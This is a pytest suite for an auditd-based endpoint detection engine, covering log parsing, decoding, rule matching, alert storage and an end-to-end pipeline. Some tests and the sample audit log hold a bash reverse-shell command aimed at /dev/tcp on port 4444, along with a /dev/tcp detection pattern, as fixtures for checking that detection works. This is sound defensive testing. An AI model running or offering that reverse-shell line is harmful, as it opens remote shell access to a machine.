"""
test_edr.py — Unit and integration tests for the EDR engine.

Run with:
    uv run python -m pytest test_edr.py -v
"""
from __future__ import annotations

import json
import os
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# ---------------------------------------------------------------------------
# edr.utils
# ---------------------------------------------------------------------------
from edr.utils import load_config, severity_gte, _deep_merge


class TestSeverityGte:
    def test_equal(self):
        assert severity_gte("HIGH", "HIGH")

    def test_higher(self):
        assert severity_gte("CRITICAL", "LOW")

    def test_lower(self):
        assert not severity_gte("INFO", "MEDIUM")

    def test_invalid_severity(self):
        assert not severity_gte("UNKNOWN", "LOW")

    def test_case_insensitive(self):
        assert severity_gte("critical", "high")


class TestDeepMerge:
    def test_simple(self):
        assert _deep_merge({"a": 1}, {"b": 2}) == {"a": 1, "b": 2}

    def test_nested_override(self):
        base = {"a": {"x": 1, "y": 2}}
        result = _deep_merge(base, {"a": {"y": 99, "z": 3}})
        assert result == {"a": {"x": 1, "y": 99, "z": 3}}

    def test_override_non_dict(self):
        assert _deep_merge({"a": 1}, {"a": 2}) == {"a": 2}


class TestLoadConfig:
    def test_defaults_when_no_file(self, tmp_path):
        cfg = load_config(str(tmp_path / "nonexistent.yaml"))
        assert "edr" in cfg
        assert cfg["edr"]["min_severity"] == "LOW"

    def test_loads_yaml(self, tmp_path):
        f = tmp_path / "cfg.yaml"
        f.write_text("edr:\n  min_severity: HIGH\n")
        cfg = load_config(str(f))
        assert cfg["edr"]["min_severity"] == "HIGH"

    def test_partial_override_keeps_defaults(self, tmp_path):
        f = tmp_path / "cfg.yaml"
        f.write_text("edr:\n  min_severity: CRITICAL\n")
        cfg = load_config(str(f))
        # Other defaults should still be present
        assert "audit_log" in cfg["edr"]


# ---------------------------------------------------------------------------
# edr.decoder
# ---------------------------------------------------------------------------
from edr.decoder import is_hex, decode_field, decode_event, reconstruct_command


class TestIsHex:
    def test_valid_hex(self):
        assert is_hex("68656c6c6f")  # "hello"

    def test_odd_length(self):
        assert not is_hex("abc")

    def test_non_hex_chars(self):
        assert not is_hex("zz")

    def test_empty(self):
        assert not is_hex("")


class TestDecodeField:
    def test_hex_decode(self):
        assert decode_field("68656c6c6f") == "hello"

    def test_plain_string(self):
        assert decode_field("bash") == "bash"

    def test_parentheses_strip(self):
        assert decode_field("(none)") == "none"


class TestDecodeEvent:
    def _event(self, **kwargs):
        return {"fields": kwargs, "argv": []}

    def test_decodes_exe(self):
        ev = self._event(exe="2f62696e2f62617368")  # /bin/bash
        decode_event(ev)
        assert ev["fields"]["exe"] == "/bin/bash"

    def test_reconstructs_cmd_from_argv(self):
        ev = {"fields": {}, "argv": ["bash", "-c", "echo hello"]}
        decode_event(ev)
        assert "bash" in ev["cmd"]
        assert "echo hello" in ev["cmd"]


class TestReconstructCommand:
    def test_simple(self):
        assert reconstruct_command(["ls", "-la"]) == "ls -la"

    def test_quotes_spaces(self):
        result = reconstruct_command(["echo", "hello world"])
        assert "hello world" in result


# ---------------------------------------------------------------------------
# edr.parser
# ---------------------------------------------------------------------------
from edr.parser import parse_line, EventAssembler


class TestParseLine:
    def test_syscall(self):
        line = (
            'type=SYSCALL msg=audit(1234567890.123:42): arch=c000003e syscall=59 '
            'pid=1234 uid=1000 exe="/bin/bash" comm="bash"'
        )
        result = parse_line(line)
        assert result is not None
        assert result["type"] == "SYSCALL"
        assert result["serial"] == "42"
        assert result["fields"]["pid"] == "1234"
        assert result["fields"]["exe"] == "/bin/bash"

    def test_execve(self):
        line = (
            'type=EXECVE msg=audit(1234567890.123:42): argc=2 a0="bash" a1="-i"'
        )
        result = parse_line(line)
        assert result is not None
        assert result["type"] == "EXECVE"

    def test_unknown_type_ignored(self):
        line = 'type=LOGIN msg=audit(1234567890.123:99): pid=1 uid=0'
        assert parse_line(line) is None

    def test_garbage_line(self):
        assert parse_line("this is not an audit line") is None

    def test_cwd(self):
        line = 'type=CWD msg=audit(1234567890.123:42): cwd="/home/user"'
        result = parse_line(line)
        assert result is not None
        assert result["fields"]["cwd"] == "/home/user"


class TestEventAssembler:
    def _make_record(self, rec_type, serial, **fields):
        return {
            "type": rec_type,
            "serial": serial,
            "timestamp": "1234567890.123",
            "fields": fields,
        }

    def test_flush_single(self):
        asm = EventAssembler()
        rec = self._make_record("SYSCALL", "1", pid="100", uid="0")
        asm.feed(rec)
        event = asm.flush_serial("1")
        assert event is not None
        assert event["serial"] == "1"
        assert event["fields"]["pid"] == "100"

    def test_flush_all_empty(self):
        asm = EventAssembler()
        assert asm.flush_all() == []

    def test_multiple_serials(self):
        asm = EventAssembler()
        asm.feed(self._make_record("SYSCALL", "1", pid="10"))
        asm.feed(self._make_record("SYSCALL", "2", pid="20"))
        all_events = asm.flush_all()
        assert len(all_events) == 2

    def test_execve_args_merged(self):
        asm = EventAssembler()
        asm.feed(self._make_record("SYSCALL", "5", pid="99", uid="0"))
        # EXECVE record with argv
        execve = {
            "type": "EXECVE",
            "serial": "5",
            "timestamp": "1234567890.000",
            "fields": {"argc": "2", "a0": "bash", "a1": "-i"},
        }
        asm.feed(execve)
        event = asm.flush_serial("5")
        assert event is not None
        assert "bash" in event.get("argv", [])


# ---------------------------------------------------------------------------
# edr.engine
# ---------------------------------------------------------------------------
from edr.engine import Rule, ThreatEngine


def _make_event(exe="/bin/bash", cmd="", argv=None, uid="1000", cwd="/tmp"):
    return {
        "serial": "99",
        "timestamp": "1234567890.000",
        "fields": {"exe": exe, "comm": os.path.basename(exe), "uid": uid, "cwd": cwd},
        "argv": argv or [],
        "cmd": cmd,
    }


class TestRule:
    def test_process_match(self):
        r = Rule({"id": "T-001", "name": "test", "severity": "HIGH",
                  "match": {"process": "^bash$"}})
        assert r.matches(_make_event(exe="/bin/bash"))
        assert not r.matches(_make_event(exe="/bin/sh"))

    def test_cmd_regex_match(self):
        r = Rule({"id": "T-002", "name": "test", "severity": "HIGH",
                  "match": {"cmd_regex": "/dev/tcp/"}})
        ev = _make_event(cmd="bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
        assert r.matches(ev)

    def test_args_regex_match(self):
        r = Rule({"id": "T-003", "name": "test", "severity": "LOW",
                  "match": {"args_regex": "^-l$"}})
        ev = _make_event(exe="/usr/bin/sudo", argv=["-l"], cmd="sudo -l")
        assert r.matches(ev)

    def test_uid_match(self):
        r = Rule({"id": "T-004", "name": "test", "severity": "HIGH",
                  "match": {"uid": 0}})
        assert r.matches(_make_event(uid="0"))
        assert not r.matches(_make_event(uid="1000"))

    def test_not_process_excludes(self):
        r = Rule({"id": "T-005", "name": "test", "severity": "LOW",
                  "match": {"cmd_regex": ".", "not_process": "^safe$"}})
        assert not r.matches(_make_event(exe="/bin/safe", cmd="safe do-thing"))

    def test_any_of_match(self):
        r = Rule({
            "id": "T-006", "name": "test", "severity": "MEDIUM",
            "match": {
                "any_of": [
                    {"cmd_regex": "pattern_a"},
                    {"args_regex": "pattern_b"},
                ]
            }
        })
        assert r.matches(_make_event(cmd="pattern_a here"))
        assert r.matches(_make_event(argv=["pattern_b"]))
        assert not r.matches(_make_event(cmd="nothing", argv=[]))

    def test_no_match_on_empty_event(self):
        r = Rule({"id": "T-007", "name": "test", "severity": "LOW",
                  "match": {"process": "^bash$"}})
        assert not r.matches({"fields": {}, "argv": [], "cmd": ""})


class TestThreatEngine:
    def test_loads_rules(self, tmp_path):
        rule_file = tmp_path / "test.yaml"
        rule_file.write_text(
            "- id: TEST-001\n  name: Test\n  severity: LOW\n"
            "  match:\n    process: '^test$'\n"
        )
        engine = ThreatEngine(rules_dir=str(tmp_path))
        assert len(engine.rules) == 1
        assert engine.rules[0].id == "TEST-001"

    def test_evaluate_returns_matching(self, tmp_path):
        rule_file = tmp_path / "test.yaml"
        rule_file.write_text(
            "- id: TEST-002\n  name: Test\n  severity: HIGH\n"
            "  match:\n    process: '^bash$'\n"
        )
        engine = ThreatEngine(rules_dir=str(tmp_path))
        matched = engine.evaluate(_make_event(exe="/bin/bash"))
        assert len(matched) == 1

    def test_evaluate_no_match(self, tmp_path):
        rule_file = tmp_path / "test.yaml"
        rule_file.write_text(
            "- id: TEST-003\n  name: Test\n  severity: HIGH\n"
            "  match:\n    process: '^evil$'\n"
        )
        engine = ThreatEngine(rules_dir=str(tmp_path))
        matched = engine.evaluate(_make_event(exe="/bin/bash"))
        assert matched == []

    def test_empty_rules_dir(self, tmp_path):
        engine = ThreatEngine(rules_dir=str(tmp_path))
        assert engine.rules == []

    def test_missing_rules_dir(self):
        engine = ThreatEngine(rules_dir="/nonexistent/path/to/rules")
        assert engine.rules == []


# ---------------------------------------------------------------------------
# edr.db (DuckDB)
# ---------------------------------------------------------------------------
from edr.db import AlertStore


def _sample_alert(n=1):
    return {
        "alert_no": n,
        "rule_id": f"EDR-{n:03d}",
        "rule_name": f"Test Rule {n}",
        "severity": "HIGH",
        "description": "Test description",
        "tags": ["test", "unit"],
        "fired_at": "2026-09-17T00:00:00+00:00",
        "event": {
            "serial": "42",
            "timestamp": "1234567890.000",
            "pid": "1234",
            "uid": "0",
            "exe": "/bin/bash",
            "comm": "bash",
            "cmd": "bash -i",
            "cwd": "/tmp",
        },
    }


class TestAlertStore:
    def test_schema_creates(self, tmp_path):
        store = AlertStore(str(tmp_path / "test.duckdb"))
        assert store.count() == 0
        store.close()

    def test_insert_and_count(self, tmp_path):
        store = AlertStore(str(tmp_path / "test.duckdb"))
        store.insert(_sample_alert(1))
        store.flush()           # batch write is buffered — flush before reading
        assert store.count() == 1
        store.close()

    def test_multiple_inserts(self, tmp_path):
        store = AlertStore(str(tmp_path / "test.duckdb"))
        for i in range(5):
            store.insert(_sample_alert(i + 1))
        store.flush()
        assert store.count() == 5
        store.close()

    def test_recent_returns_list(self, tmp_path):
        store = AlertStore(str(tmp_path / "test.duckdb"))
        store.insert(_sample_alert(1))
        store.flush()
        rows = store.recent(limit=10)
        assert len(rows) == 1
        assert rows[0]["rule_id"] == "EDR-001"
        store.close()

    def test_recent_severity_filter(self, tmp_path):
        store = AlertStore(str(tmp_path / "test.duckdb"))
        a = _sample_alert(1)
        a["severity"] = "CRITICAL"
        store.insert(a)
        store.insert(_sample_alert(2))
        store.flush()
        rows = store.recent(severity="CRITICAL")
        assert len(rows) == 1
        store.close()

    def test_recent_min_severity(self, tmp_path):
        store = AlertStore(str(tmp_path / "test.duckdb"))
        for sev, n in [("INFO", 1), ("LOW", 2), ("HIGH", 3), ("CRITICAL", 4)]:
            a = _sample_alert(n)
            a["severity"] = sev
            store.insert(a)
        store.flush()
        rows = store.recent(min_severity="HIGH")
        sevs = {r["severity"] for r in rows}
        assert "INFO" not in sevs
        assert "LOW" not in sevs
        store.close()

    def test_count_severity_filter(self, tmp_path):
        store = AlertStore(str(tmp_path / "test.duckdb"))
        a = _sample_alert(1)
        a["severity"] = "LOW"
        store.insert(a)
        store.insert(_sample_alert(2))  # HIGH
        store.flush()
        assert store.count(severity="LOW") == 1
        assert store.count(severity="HIGH") == 1
        store.close()

    def test_stats(self, tmp_path):
        store = AlertStore(str(tmp_path / "test.duckdb"))
        store.insert(_sample_alert(1))
        store.flush()
        s = store.stats()
        assert s["total"] == 1
        assert "HIGH" in s["by_severity"]
        assert len(s["top_rules"]) == 1
        store.close()

    def test_stats_richer_fields(self, tmp_path):
        """Stats now returns unique_rules, first_seen, last_seen per severity."""
        store = AlertStore(str(tmp_path / "test.duckdb"))
        store.insert(_sample_alert(1))
        store.flush()
        s = store.stats()
        sev_data = s["by_severity"]["HIGH"]
        assert "count" in sev_data
        assert "unique_rules" in sev_data
        store.close()

    def test_tags_stored_as_array(self, tmp_path):
        """tags column is VARCHAR[] — verify tag_frequency uses unnest correctly."""
        store = AlertStore(str(tmp_path / "test.duckdb"))
        store.insert(_sample_alert(1))  # tags: ["test", "unit"]
        store.flush()
        freqs = store.tag_frequency()
        tags_found = {r["tag"] for r in freqs}
        assert "test" in tags_found
        assert "unit" in tags_found
        store.close()

    def test_timeline_returns_list(self, tmp_path):
        store = AlertStore(str(tmp_path / "test.duckdb"))
        store.insert(_sample_alert(1))
        store.flush()
        tl = store.timeline(bucket="minute")
        assert isinstance(tl, list)
        store.close()

    def test_heatmap_returns_list(self, tmp_path):
        store = AlertStore(str(tmp_path / "test.duckdb"))
        store.insert(_sample_alert(1))
        store.flush()
        hm = store.heatmap()
        assert isinstance(hm, list)
        if hm:
            assert "hour" in hm[0]
            assert "severity" in hm[0]
            assert "count" in hm[0]
        store.close()

    def test_context_manager(self, tmp_path):
        with AlertStore(str(tmp_path / "test.duckdb")) as store:
            store.insert(_sample_alert(1))
            store.flush()
            assert store.count() == 1

    def test_persistence(self, tmp_path):
        path = str(tmp_path / "test.duckdb")
        with AlertStore(path) as s:
            s.insert(_sample_alert(1))
        # close() calls flush() automatically
        with AlertStore(path) as s:
            assert s.count() == 1


# ---------------------------------------------------------------------------
# edr.alerter (with mock db)
# ---------------------------------------------------------------------------
from edr.alerter import Alerter
from edr.engine import Rule as EngineRule


def _make_rule(rule_id="EDR-001", severity="HIGH"):
    return EngineRule({
        "id": rule_id,
        "name": "Test Rule",
        "severity": severity,
        "description": "A test rule",
        "tags": ["test"],
        "match": {},
    })


class TestAlerter:
    def test_writes_jsonl(self, tmp_path):
        log = tmp_path / "alerts.jsonl"
        alerter = Alerter(alert_log=str(log), use_color=False)
        alerter.emit(_make_rule(), _make_event())
        lines = log.read_text().strip().splitlines()
        assert len(lines) == 1
        data = json.loads(lines[0])
        assert data["rule_id"] == "EDR-001"
        assert data["severity"] == "HIGH"

    def test_alert_no_increments(self, tmp_path):
        log = tmp_path / "alerts.jsonl"
        alerter = Alerter(alert_log=str(log), use_color=False)
        alerter.emit(_make_rule(), _make_event())
        alerter.emit(_make_rule(), _make_event())
        lines = log.read_text().strip().splitlines()
        assert json.loads(lines[0])["alert_no"] == 1
        assert json.loads(lines[1])["alert_no"] == 2

    def test_calls_db_insert(self, tmp_path):
        log = tmp_path / "alerts.jsonl"
        mock_db = MagicMock()
        alerter = Alerter(alert_log=str(log), use_color=False, db_store=mock_db)
        alerter.emit(_make_rule(), _make_event())
        mock_db.insert.assert_called_once()

    def test_db_error_does_not_crash(self, tmp_path, capsys):
        log = tmp_path / "alerts.jsonl"
        mock_db = MagicMock()
        mock_db.insert.side_effect = RuntimeError("db error")
        alerter = Alerter(alert_log=str(log), use_color=False, db_store=mock_db)
        alerter.emit(_make_rule(), _make_event())  # should not raise


# ---------------------------------------------------------------------------
# Integration: full pipeline
# ---------------------------------------------------------------------------
class TestFullPipeline:
    """
    Simulate a complete parse→decode→match→alert pipeline without root or
    a real auditd log.
    """

    SAMPLE_LOG = """\
type=SYSCALL msg=audit(1726459622.123:100): arch=c000003e syscall=59 pid=3847 uid=1000 exe="/bin/bash" comm="bash" key=(null)
type=EXECVE msg=audit(1726459622.123:100): argc=3 a0="bash" a1="-c" a2="bash -i >& /dev/tcp/192.168.1.10/4444 0>&1"
type=CWD msg=audit(1726459622.123:100): cwd="/home/user"
type=SYSCALL msg=audit(1726459622.456:101): arch=c000003e syscall=59 pid=999 uid=0 exe="/usr/bin/sudo" comm="sudo" key=(null)
type=EXECVE msg=audit(1726459622.456:101): argc=2 a0="sudo" a1="-l"
"""

    def test_reverse_shell_detected(self, tmp_path, capsys):
        from edr.parser import EventAssembler, parse_line
        from edr.decoder import decode_event
        from edr.engine import ThreatEngine
        from edr.alerter import Alerter
        from edr.utils import severity_gte

        log = tmp_path / "alerts.jsonl"
        alerter = Alerter(alert_log=str(log), use_color=False)
        engine = ThreatEngine(rules_dir="rules")
        assembler = EventAssembler()

        alerts_fired = []
        prev_serial = None

        def check_and_alert(event):
            for rule in engine.evaluate(event):
                if severity_gte(rule.severity, "INFO"):
                    alerter.emit(rule, event)
                    alerts_fired.append(rule.id)

        for raw_line in self.SAMPLE_LOG.strip().splitlines():
            record = parse_line(raw_line)
            if not record:
                continue
            serial = record["serial"]
            if prev_serial and serial != prev_serial:
                ev = assembler.flush_serial(prev_serial)
                if ev:
                    decode_event(ev)
                    check_and_alert(ev)
            assembler.feed(record)
            prev_serial = serial

        if prev_serial:
            ev = assembler.flush_serial(prev_serial)
            if ev:
                decode_event(ev)
                check_and_alert(ev)

        assert "EDR-001" in alerts_fired, "Reverse shell should be detected"
        assert "EDR-101" in alerts_fired, "sudo -l should be detected"

    def test_jsonl_output_valid_json(self, tmp_path):
        from edr.parser import EventAssembler, parse_line
        from edr.decoder import decode_event
        from edr.engine import ThreatEngine
        from edr.alerter import Alerter

        log = tmp_path / "alerts.jsonl"
        alerter = Alerter(alert_log=str(log), use_color=False)
        engine = ThreatEngine(rules_dir="rules")
        assembler = EventAssembler()

        for raw_line in self.SAMPLE_LOG.strip().splitlines():
            record = parse_line(raw_line)
            if record:
                assembler.feed(record)

        for ev in assembler.flush_all():
            decode_event(ev)
            for rule in engine.evaluate(ev):
                alerter.emit(rule, ev)

        if log.exists():
            for line in log.read_text().strip().splitlines():
                json.loads(line)  # Must not raise
